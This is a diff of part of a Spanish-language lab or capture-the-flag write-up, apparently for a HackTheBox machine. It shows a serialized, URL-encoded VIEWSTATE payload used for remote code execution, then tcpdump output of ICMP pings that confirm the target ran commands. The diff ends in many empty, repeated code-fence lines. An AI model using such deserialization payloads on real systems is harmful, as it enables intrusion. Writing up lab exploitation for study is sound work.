@@ -289,4 +289,32 @@ Payload serializado obtenido lo reemplzamo por el valor original de VIEWSTATE
 ```bash
 3KbrG63qMQmNkSg2M0cFiqqQgynyFcLjO4D21eKidrHTgeAha957dEXozDmsjtMpYARCOB6720NDkC%2Bom7woPnNVgff3bMVF2XkBqxc44l1rhja03iPUq5DGxkt0zHEePLIENkgYnfaNKne2dYxxiD4OBdlvP6s5t6pqeDBMaJMNDeCg2ufhX%2FkSYevM22eRBQ8HpsOrJYd%2BGlVCSKnWCrkAmT28OR5B7U95kJ27QjMaQfR5SFfFyMCuKkyI5dycOM95MbYHTzdQweR0IqkaI%2BqjLFM7sz2c76lSpAGU%2FGdgKHGopwxyz%2FMg96xnsrKtyf1dOuWqHbia4%2Bm6ZnuqMCnTi%2BQ%2F5kI3Dfh%2BaF%2Fy7kIAga2mQLf2lwGw8yK7tHmAF%2F3RlDVbFaGO2E0APO9Nk%2FGMSl2dMCL%2Fcj0l0gUKwN3PpUPn6d9q7ZGMRdL8Lfe%2FCwHak%2FPNiwxlt51p4iu0VmWIGN7APthgMLcHiBmIiolpwdkUxs46aDAuE4GxVmoPXODibPIBb2nW3QavkUUx1Eryz7Y9L%2BpAFH424qGdTAoI06UkEkwHlHWU4lcDC7r4VJUNBR%2BTgxUzuuI7MsvpL6e4AC4jyL0iFqH%2FuvaDPa%2FzVs2U1IvVuSvOBySaMaowC9hKBWDnSgMwRiDXLxERfFpJRcP7Jl5fvEDdyLVIxeS19g4CPbix9B%2BX8V8JNFLtewvkVDyHPEYWVqM3zX%2B4bB8hX5uY9PPiv3UBTauqaeEIQf2qpsk2l6Xwoj7W%2B4CKWZuTiYItXzjgPdx6D6l75z12IPY%2FTML3Jj166xSKmqYPgH0p6Ou4aFVlk0SFZqpsGWAIqwNZR%2BPZYHy50q%2F8aXAkJ9nVtoTK2blK9TgyOf6muixrZ%2B4xTJzhXOwSohUCQPP%2B3TXlzEotako1RvtJYLKbL0u6t%2FERIyb9KmEB9zk5xeE2KJauRPKYRezvFU0cVjnmL24zVS9Jl1ucu2OO7sP6Hw3Udsl3Kp2sW85BxOBIuLo3HJlQxZnZ93AGa4fUvN6JJ4yi7W%2FyTOqqgwDaCb14pb5QaCqZEHMZSubtIWSkEu6bTcGFxj6JJvVhsfxcUBrVFkbiKp%2FziTRf6gSKPH%2F%2BCtwws9O%2BOdcP2NGh3cxWFtBPl0X67PmSHeWiIrhUG6mrE%2FP8Z%2FejMtUnYN6%2FTd%2Bbc7I6t4EcB5vhz1L0vXBv8cD%2Bs8dhLvJ%2FqVyk20OG6k6jZriIMgFDynRxcrPCgrUtwniUgKtecrG29FMvPOc37OPKcYgnou40k0vqIP6k4SzRxy1%2B3O%2Byvt0eEDvm3AtmcG8%3D
 ```
+y obtenmos conexiones en la interfast tun0, ya somos ca[aces de ejecutar comandos]
 ```bash
+──╼ #tcpdump -i tun0 icmp -n
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+11:36:45.749433 IP 10.129.185.102 > 10.10.15.14: ICMP echo request, id 1, seq 1, length 40
+11:36:45.749457 IP 10.10.15.14 > 10.129.185.102: ICMP echo reply, id 1, seq 1, length 40
+11:36:46.760225 IP 10.129.185.102 > 10.10.15.14: ICMP echo request, id 1, seq 2, length 40
+11:36:46.760237 IP 10.10.15.14 > 10.129.185.102: ICMP echo reply, id 1, seq 2, length 40
+11:36:47.776223 IP 10.129.185.102 > 10.10.15.14: ICMP echo request, id 1, seq 3, length 40
+11:36:47.776235 IP 10.10.15.14 > 10.129.185.102: ICMP echo reply, id 1, seq 3, length 40
+11:36:48.791137 IP 10.129.185.102 > 10.10.15.14: ICMP echo request, id 1, seq 4, length 40
+11:36:48.791157 IP 10.10.15.14 > 10.129.185.102: ICMP echo reply, id 1, seq 4, length 40
+
+```bash
+```bash
+```bash
+```bash
+```bash
+```bash
+```bash
+```bash
+```bash
+```bash
+```bash
+```bash
+```bash
+```bash
+
